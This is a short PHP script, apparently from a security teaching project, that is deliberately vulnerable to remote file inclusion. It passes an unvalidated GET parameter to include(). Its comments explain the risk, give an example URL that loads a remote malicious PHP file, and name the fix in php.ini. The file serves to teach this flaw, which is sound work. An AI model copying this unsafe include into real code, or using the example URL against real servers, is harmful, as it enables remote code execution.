<?php
// DESCRIPTION: This script execute the file passed in the GET parameter "file".
// This is a security risk because it allows to execute any file on the server
// if the parameter in `php.ini` `allow_url_include` is set to `On` 
// FILE: https://localhost/devinci-cracks/view/rfi.php?file=https://raw.githubusercontent.com/Kotsudes/devinci-cracks/main/rfi_malicious.php
// SOLUTION: Set `allow_url_include` to `Off` in `php.ini`
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
} else {
    echo "No file selected.";
}
?>